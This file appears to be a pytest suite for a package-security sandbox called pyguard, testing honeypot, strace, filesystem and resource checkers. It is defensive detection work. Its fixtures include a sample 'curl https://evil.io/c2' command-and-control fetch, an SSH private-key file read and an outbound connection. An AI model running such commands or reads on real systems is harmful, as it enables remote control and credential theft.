"""Unit tests for Layer 3 — sandbox checker chain (Chain of Responsibility)."""
from __future__ import annotations

import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from pyguard.layers.sandbox import (
    FilesystemChecker,
    HoneypotChecker,
    ResourceChecker,
    SandboxContext,
    SandboxLayer,
    StraceChecker,
    _HONEYPOT_FILES,
    _snapshot_directory,
    _write_honeypot,
)
from pyguard.models import PackageInfo, PackageMetadata, Severity


# ---------------------------------------------------------------------------
# Fixture
# ---------------------------------------------------------------------------

@pytest.fixture()
def package() -> PackageInfo:
    return PackageInfo(
        name="evil-pkg",
        version="1.0.0",
        source_path=Path("/tmp/evil"),
        metadata=PackageMetadata(),
    )


@pytest.fixture()
def home_dir(tmp_path: Path) -> Path:
    home = tmp_path / "home"
    home.mkdir()
    _write_honeypot(home)
    return home


@pytest.fixture()
def clean_ctx(package: PackageInfo, home_dir: Path) -> SandboxContext:
    return SandboxContext(package=package, home_dir=home_dir, output="")


# ---------------------------------------------------------------------------
# HoneypotChecker
# ---------------------------------------------------------------------------

class TestHoneypotChecker:
    def test_no_findings_on_clean_output(self, clean_ctx: SandboxContext) -> None:
        checker = HoneypotChecker()
        checker.check(clean_ctx)
        assert clean_ctx.findings == []

    def test_detects_marker_in_output(self, clean_ctx: SandboxContext) -> None:
        clean_ctx.output = "PYGUARD_HONEYPOT_SSH_KEY"
        checker = HoneypotChecker()
        checker.check(clean_ctx)
        assert any(f.severity == Severity.CRITICAL for f in clean_ctx.findings)
        assert any("exfiltration" in f.title.lower() or "honeypot" in f.title.lower() for f in clean_ctx.findings)

    def test_detects_file_tampering(self, clean_ctx: SandboxContext) -> None:
        # Modify a honeypot file
        ssh_file = clean_ctx.home_dir / ".ssh" / "id_rsa"
        ssh_file.write_text("TAMPERED CONTENT", encoding="utf-8")
        checker = HoneypotChecker()
        checker.check(clean_ctx)
        assert any("modified" in f.title.lower() for f in clean_ctx.findings)


# ---------------------------------------------------------------------------
# StraceChecker
# ---------------------------------------------------------------------------

class TestStraceChecker:
    def test_no_findings_on_empty_strace_log(self, clean_ctx: SandboxContext) -> None:
        checker = StraceChecker()
        checker.check(clean_ctx)
        assert clean_ctx.findings == []

    def test_detects_external_connect(self, clean_ctx: SandboxContext) -> None:
        clean_ctx.strace_log = (
            'connect(3, {sa_family=AF_INET, sin_addr=inet_addr("1.2.3.4"), sin_port=htons(443)}, 16) = 0'
        )
        checker = StraceChecker()
        checker.check(clean_ctx)
        assert any("1.2.3.4" in f.title for f in clean_ctx.findings)
        assert all(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in clean_ctx.findings)

    def test_skips_loopback_connect(self, clean_ctx: SandboxContext) -> None:
        clean_ctx.strace_log = (
            'connect(3, {sa_family=AF_INET, sin_addr=inet_addr("127.0.0.1"), sin_port=htons(443)}, 16) = 0'
        )
        checker = StraceChecker()
        checker.check(clean_ctx)
        assert clean_ctx.findings == []

    def test_detects_sensitive_file_open(self, clean_ctx: SandboxContext) -> None:
        clean_ctx.strace_log = 'openat(AT_FDCWD, "/root/.ssh/id_rsa", O_RDONLY) = 3'
        checker = StraceChecker()
        checker.check(clean_ctx)
        assert any(".ssh" in f.title for f in clean_ctx.findings)


# ---------------------------------------------------------------------------
# FilesystemChecker
# ---------------------------------------------------------------------------

class TestFilesystemChecker:
    def test_no_findings_when_no_snapshots(self, clean_ctx: SandboxContext) -> None:
        checker = FilesystemChecker()
        checker.check(clean_ctx)
        assert clean_ctx.findings == []

    def test_detects_new_file(self, clean_ctx: SandboxContext, tmp_path: Path) -> None:
        before: dict[str, str] = {}
        after: dict[str, str] = {"/tmp/new_file.py": "abc123"}
        clean_ctx.fs_snapshot_before = before
        clean_ctx.fs_snapshot_after = after
        checker = FilesystemChecker()
        checker.check(clean_ctx)
        assert any("new file" in f.title.lower() for f in clean_ctx.findings)

    def test_detects_modified_file(self, clean_ctx: SandboxContext) -> None:
        path = "/home/pyguard/.bashrc"
        clean_ctx.fs_snapshot_before = {path: "aaa"}
        clean_ctx.fs_snapshot_after = {path: "bbb"}
        checker = FilesystemChecker()
        checker.check(clean_ctx)
        assert any("modified" in f.title.lower() for f in clean_ctx.findings)

    def test_detects_deleted_file(self, clean_ctx: SandboxContext) -> None:
        path = "/home/pyguard/important.py"
        clean_ctx.fs_snapshot_before = {path: "ccc"}
        clean_ctx.fs_snapshot_after = {}
        checker = FilesystemChecker()
        checker.check(clean_ctx)
        assert any("deleted" in f.title.lower() for f in clean_ctx.findings)


# ---------------------------------------------------------------------------
# ResourceChecker
# ---------------------------------------------------------------------------

class TestResourceChecker:
    def _make_stats(self, cpu_total: int, pre_cpu_total: int, system: int, pre_system: int) -> dict:
        return {
            "cpu_stats": {
                "cpu_usage": {"total_usage": cpu_total},
                "system_cpu_usage": system,
                "online_cpus": 1,
            },
            "precpu_stats": {
                "cpu_usage": {"total_usage": pre_cpu_total},
                "system_cpu_usage": pre_system,
            },
        }

    def test_no_findings_on_normal_cpu(self, clean_ctx: SandboxContext) -> None:
        clean_ctx.container_stats = self._make_stats(1_000_000, 500_000, 100_000_000, 50_000_000)
        checker = ResourceChecker()
        checker.check(clean_ctx)
        # CPU = (500k / 50M) * 1 * 100 = 1% → no finding
        assert clean_ctx.findings == []

    def test_flags_high_cpu(self, clean_ctx: SandboxContext) -> None:
        # CPU = (45M / 50M) * 1 * 100 = 90%
        clean_ctx.container_stats = self._make_stats(50_000_000, 5_000_000, 100_000_000, 50_000_000)
        checker = ResourceChecker()
        checker.check(clean_ctx)
        assert any("CPU" in f.title for f in clean_ctx.findings)

    def test_detects_curl_in_output(self, clean_ctx: SandboxContext) -> None:
        clean_ctx.output = "curl https://evil.io/c2"
        checker = ResourceChecker()
        checker.check(clean_ctx)
        assert any("curl" in f.title.lower() for f in clean_ctx.findings)


# ---------------------------------------------------------------------------
# Checker chain ordering
# ---------------------------------------------------------------------------

class TestCheckerChain:
    def test_chain_runs_all_checkers(self, clean_ctx: SandboxContext) -> None:
        """All four checkers should be visited in order."""
        visited: list[str] = []

        class TrackingChecker(HoneypotChecker):
            def _check_impl(self, ctx: SandboxContext) -> None:
                visited.append("honeypot")

        class TrackingStrace(StraceChecker):
            def _check_impl(self, ctx: SandboxContext) -> None:
                visited.append("strace")

        class TrackingFS(FilesystemChecker):
            def _check_impl(self, ctx: SandboxContext) -> None:
                visited.append("fs")

        class TrackingResource(ResourceChecker):
            def _check_impl(self, ctx: SandboxContext) -> None:
                visited.append("resource")

        head = TrackingChecker()
        strace = head.set_next(TrackingStrace())
        fs = strace.set_next(TrackingFS())
        fs.set_next(TrackingResource())

        head.check(clean_ctx)
        assert visited == ["honeypot", "strace", "fs", "resource"]


# ---------------------------------------------------------------------------
# Filesystem snapshot helper
# ---------------------------------------------------------------------------

class TestSnapshotDirectory:
    def test_captures_file_hashes(self, tmp_path: Path) -> None:
        (tmp_path / "a.py").write_bytes(b"hello")
        snapshot = _snapshot_directory(tmp_path)
        assert "a.py" in snapshot
        assert len(snapshot["a.py"]) == 64  # sha256 hex

    def test_empty_for_nonexistent_dir(self, tmp_path: Path) -> None:
        snapshot = _snapshot_directory(tmp_path / "missing")
        assert snapshot == {}


# ---------------------------------------------------------------------------
# SandboxLayer — Docker disabled
# ---------------------------------------------------------------------------

class TestSandboxLayerNoDocker:
    @pytest.mark.asyncio
    async def test_returns_empty_when_docker_unavailable(self, package: PackageInfo) -> None:
        layer = SandboxLayer()
        layer._docker_available = False
        findings = await layer.analyze(package)
        assert findings == []

    @pytest.mark.asyncio
    async def test_skips_unversioned_package(self, package: PackageInfo) -> None:
        layer = SandboxLayer()
        layer._docker_available = True
        package_no_ver = PackageInfo(
            name="pkg", version="latest", source_path=Path("/tmp"), metadata=PackageMetadata()
        )
        findings = await layer.analyze(package_no_ver)
        assert findings == []
